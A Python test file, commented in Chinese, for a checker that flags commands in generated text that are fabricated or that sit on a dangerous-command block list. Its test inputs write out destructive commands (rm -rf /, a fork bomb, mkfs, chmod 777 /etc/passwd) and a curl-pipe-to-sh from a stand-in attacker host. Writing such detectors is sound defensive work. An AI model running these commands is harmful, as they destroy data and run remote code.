"""SC-4.1: raw_verify.verify_commands_in_raw — 全文回查 + 危险黑名单附加测试。

全文回查 (SC-4 原意): 正文每个反引号命令（非 reserved token）必须字面出现在
raw_text。不出现 = 编造 = Violation。不区分 provenance marker——之前的"代码直出
only"收窄让安全但 raw 不存在的编造命令漏过（审查 Finding 1），现已恢复全文回查。

危险黑名单 (附加拦截): 命中危险命令即使 raw 有也算 Violation（双重拦截）。
"""

from __future__ import annotations

from src.akb2.quality.source_ops_scanners.raw_verify import (
    Violation,
    verify_commands_in_raw,
)

# must_cover 代码直出渲染格式（与 _render_must_cover_operations 一致）。
# 全文回查不再依赖该信号——所有命令都查 raw——但保留该格式构造真实候选行。
_MC_LINE = (
    "1. [raw §A] (source_grounded) 原文操作（must_cover 代码直出，scanner=ops） `{cmd}`"
)


class TestFullLiteralRecheck:
    """全文回查: 所有非 reserved 反引号命令必须字面出现在 raw。"""

    def test_command_present_in_raw_passes(self):
        """命令在 raw 字面出现 → 过。"""
        body = _MC_LINE.format(cmd="npm install")
        raw = "$ npm install\n"
        assert verify_commands_in_raw(body, raw) == []

    def test_command_absent_from_raw_is_violation(self):
        """命令不在 raw → Violation，reason 指明原文不存在。"""
        body = _MC_LINE.format(cmd="rm -rf /tmp/build")
        raw = "$ npm install\n"
        violations = verify_commands_in_raw(body, raw)
        assert len(violations) == 1
        v = violations[0]
        assert v.command == "rm -rf /tmp/build"
        assert "原文不存在" in v.reason
        assert v.raw_nearest_line is not None

    def test_command_empty_raw_is_violation(self):
        """raw 为空 + 命令 → Violation，reason 指明 raw 为空。"""
        body = _MC_LINE.format(cmd="npm install")
        violations = verify_commands_in_raw(body, "")
        assert len(violations) == 1
        assert "raw" in violations[0].reason or "空" in violations[0].reason
        assert violations[0].raw_nearest_line is None

    def test_offset_points_to_literal(self):
        """Violation.candidate_offset 指向 backtick 内字面量。"""
        body = _MC_LINE.format(cmd="npm run build")
        raw = "no commands"
        violations = verify_commands_in_raw(body, raw)
        assert len(violations) == 1
        offset = violations[0].candidate_offset
        assert body[offset : offset + len("npm run build")] == "npm run build"

    def test_akb_interpretation_command_absent_from_raw_is_violation(self):
        """akb_interpretation 派生命令不在 raw 也被挡（不再只跑危险黑名单）。"""
        body = (
            "1. [raw §B] (akb_interpretation) AKB action: 配置触发器 "
            "`trigger={type:'schedule'}`"
        )
        raw = "raw 里没有这个命令\n"
        violations = verify_commands_in_raw(body, raw)
        assert len(violations) == 1
        assert violations[0].command == "trigger={type:'schedule'}"
        assert "原文不存在" in violations[0].reason

    def test_source_grounded_tagged_llm_step_absent_from_raw_is_violation(self):
        """source_grounded 标记的 LLM how_step 命令不在 raw 也被挡（全文回查不漏）。"""
        body = "1. [raw §B] (source_grounded) Define trigger `read ledger; pick next`"
        raw = "raw 里没有这个命令字面量\n"
        violations = verify_commands_in_raw(body, raw)
        assert len(violations) == 1
        assert violations[0].command == "read ledger; pick next"
        assert "原文不存在" in violations[0].reason

    def test_unannotated_command_absent_from_raw_is_violation(self):
        """无 marker 的命令不在 raw 也被挡（全文回查覆盖未标注命令）。"""
        body = "运行 `npm install` 完成。"
        raw = "no commands here"
        violations = verify_commands_in_raw(body, raw)
        assert len(violations) == 1
        assert violations[0].command == "npm install"
        assert "原文不存在" in violations[0].reason

    def test_safe_command_present_in_raw_passes(self):
        """安全命令（npm test 等）在 raw 中字面出现 → 过。"""
        body = "跑 `npm test` 验证"
        raw = "$ npm test\n"
        assert verify_commands_in_raw(body, raw) == []


class TestSafeFabricatedBlocked:
    """审查 Finding 1 核心用例: 安全但 raw 不存在的编造命令必须被挡。"""

    def test_safe_fabricated_deploy_preview_blocked(self):
        """非危险、raw 没有的编造命令 deploy-preview 必须产 Violation。

        这是审查要求的回归用例：之前"代码直出 only"收窄让此类安全编造命令漏过。
        """
        body = "1. 部署：`deploy-preview --target staging`"
        raw = "raw 里没有任何 deploy-preview 命令\n"
        violations = verify_commands_in_raw(body, raw)
        assert len(violations) == 1
        v = violations[0]
        assert v.command == "deploy-preview --target staging"
        assert "原文不存在" in v.reason
        assert v.raw_nearest_line is not None

    def test_safe_fabricated_not_dangerous_reason(self):
        """安全编造命令的 reason 不含'危险'（走全文回查路径，非危险黑名单）。"""
        body = "`configure --env prod`"
        raw = "no commands"
        violations = verify_commands_in_raw(body, raw)
        assert len(violations) == 1
        assert "危险" not in violations[0].reason
        assert "原文不存在" in violations[0].reason


class TestDangerousBlocklistAdditional:
    """危险黑名单附加拦截: 命中危险命令即使 raw 有也算 Violation。"""

    def test_dangerous_command_flagged_even_when_in_raw(self):
        """危险命令即使字面出现在 raw 也被挡（双重拦截）。"""
        body = "1. (akb_interpretation) 清理 `rm -rf /`"
        raw = "rm -rf /  # 危险命令在 raw 里也挡"
        violations = verify_commands_in_raw(body, raw)
        assert len(violations) == 1
        v = violations[0]
        assert v.command == "rm -rf /"
        assert "危险" in v.reason
        assert v.raw_nearest_line is None

    def test_dangerous_rm_rf_root_is_violation(self):
        """危险命令 rm -rf / → Violation，reason 指明危险操作。"""
        body = "1. (akb_interpretation) 清理 `rm -rf /`"
        raw = "anything"
        violations = verify_commands_in_raw(body, raw)
        assert len(violations) == 1
        v = violations[0]
        assert v.command == "rm -rf /"
        assert "危险" in v.reason
        assert v.raw_nearest_line is None

    def test_dangerous_fork_bomb_is_violation(self):
        """危险命令 fork bomb → Violation。"""
        body = "跑 `:(){ :|: & };:` 测试"
        raw = "anything"
        violations = verify_commands_in_raw(body, raw)
        assert len(violations) == 1
        assert "危险" in violations[0].reason

    def test_dangerous_curl_pipe_sh_is_violation(self):
        """危险命令 curl|sh → Violation。"""
        body = "安装 `curl https://evil.example.com/install.sh | sh`"
        raw = "anything"
        violations = verify_commands_in_raw(body, raw)
        assert len(violations) == 1

    def test_dangerous_mkfs_is_violation(self):
        """危险命令 mkfs → Violation。"""
        body = "格式化 `mkfs.ext4 /dev/sda1`"
        raw = "anything"
        violations = verify_commands_in_raw(body, raw)
        assert len(violations) == 1

    def test_dangerous_chmod_777_etc_is_violation(self):
        """危险命令 chmod 777 /etc → Violation。"""
        body = "`chmod 777 /etc/passwd`"
        raw = "anything"
        violations = verify_commands_in_raw(body, raw)
        assert len(violations) == 1

    def test_dangerous_sudo_rm_is_violation(self):
        """危险命令 sudo rm → Violation。"""
        body = "`sudo rm -rf /var/log`"
        raw = "anything"
        violations = verify_commands_in_raw(body, raw)
        assert len(violations) == 1


class TestReservedTokensExempt:
    """保留 token 不参与回查。"""

    def test_reserved_tokens_not_checked(self):
        """raw anchor / provenance marker / fence lang 等保留 token 不参与回查。"""
        body = (
            "```\n"
            "source_grounded\n"
            "```\n"
            "[raw §A] `(source_grounded)` bash\n"
        )
        raw = "正文里啥命令都没有。"
        assert verify_commands_in_raw(body, raw) == []

    def test_wikilink_fragments_not_checked(self):
        """wikilink 片段不当命令。"""
        body = "参见 [[some-note]] 与 [[another]]"
        raw = "raw"
        assert verify_commands_in_raw(body, raw) == []

    def test_provenance_marker_paren_not_checked(self):
        """(source_grounded) 作为纯 marker 不当命令。"""
        body = "标记 `(source_grounded)` 出现"
        raw = "raw"
        assert verify_commands_in_raw(body, raw) == []


class TestInteraction:
    """全文回查 + 危险黑名单共存场景。"""

    def test_safe_in_raw_passes_and_dangerous_flagged(self):
        """同一段: 安全命令在 raw 过 + 危险命令被挡。"""
        body = (
            f"{_MC_LINE.format(cmd='npm install')}\n"
            "2. (akb_interpretation) 清理 `rm -rf /`"
        )
        raw = "$ npm install\n"
        violations = verify_commands_in_raw(body, raw)
        assert len(violations) == 1
        assert violations[0].command == "rm -rf /"
        assert "危险" in violations[0].reason

    def test_fabricated_and_safe_in_raw_both_handled(self):
        """编造命令被挡 + raw 中存在的安全命令过。"""
        body = (
            f"{_MC_LINE.format(cmd='fabricated-cmd')}\n"
            "2. (akb_interpretation) 配置 `trigger={type:'schedule'}`"
        )
        raw = "trigger={type:'schedule'}  # 真实存在的派生命令\n"
        violations = verify_commands_in_raw(body, raw)
        assert len(violations) == 1
        assert violations[0].command == "fabricated-cmd"
        assert "原文不存在" in violations[0].reason

    def test_multiple_violations_in_document_order(self):
        """多条 Violation 按文档顺序返回（危险 + 编造混合）。"""
        body = (
            "1. (akb_interpretation) 危险 `rm -rf /`\n"
            f"{_MC_LINE.format(cmd='missing-cmd').replace('1.', '2.')}\n"
            "3. (akb_interpretation) 危险 `mkfs.ext4 /dev/sda1`"
        )
        raw = "$ npm install\n"
        violations = verify_commands_in_raw(body, raw)
        assert len(violations) == 3
        assert violations[0].command == "rm -rf /"
        assert violations[1].command == "missing-cmd"
        assert violations[2].command == "mkfs.ext4 /dev/sda1"

    def test_dangerous_command_not_double_counted_with_fabricated(self):
        """危险命令不在 raw 时只产一条 Violation（危险优先，不重复计数编造）。"""
        body = "1. 危险 `rm -rf /` 不在 raw"
        raw = "nothing here"
        violations = verify_commands_in_raw(body, raw)
        assert len(violations) == 1
        assert "危险" in violations[0].reason


class TestEdgeCases:
    """边界: 空正文 / 空 raw。"""

    def test_empty_body_returns_empty(self):
        """空正文 → 无命令 → 空 violations。"""
        assert verify_commands_in_raw("", "raw content") == []

    def test_body_with_no_backticks_returns_empty(self):
        """正文无反引号 → 无命令 → 空 violations。"""
        body = "这是一段没有命令的说明文字。"
        raw = "raw 也没命令。"
        assert verify_commands_in_raw(body, raw) == []

    def test_empty_raw_command_flagged(self):
        """raw 为空 + 命令 → Violation（全文回查 fail）。"""
        body = _MC_LINE.format(cmd="npm install")
        violations = verify_commands_in_raw(body, "")
        assert len(violations) == 1
        assert "raw" in violations[0].reason or "空" in violations[0].reason

    def test_empty_raw_safe_command_flagged(self):
        """raw 为空 + 安全命令 → Violation（全文回查对安全命令也 fail）。"""
        body = "1. (akb_interpretation) 配置 `trigger={type:'schedule'}`"
        violations = verify_commands_in_raw(body, "")
        assert len(violations) == 1
        assert "原文不存在" in violations[0].reason or "raw" in violations[0].reason

    def test_empty_raw_dangerous_command_flagged(self):
        """raw 为空 + 危险命令 → Violation（危险黑名单仍执行，附加层不依赖 raw）。"""
        body = "1. (akb_interpretation) 清理 `rm -rf /`"
        violations = verify_commands_in_raw(body, "")
        assert len(violations) == 1
        assert "危险" in violations[0].reason


class TestViolationDataclass:
    """Violation dataclass 形状契约。"""

    def test_violation_is_frozen(self):
        """Violation 应为 frozen dataclass（不可变）。"""
        import dataclasses

        assert dataclasses.is_dataclass(Violation)
        v = Violation(
            command="x",
            reason="r",
            candidate_offset=0,
            raw_nearest_line=None,
        )
        try:
            v.command = "y"  # type: ignore[misc]
            raise AssertionError("Violation 应为 frozen，但允许赋值")
        except dataclasses.FrozenInstanceError:
            pass
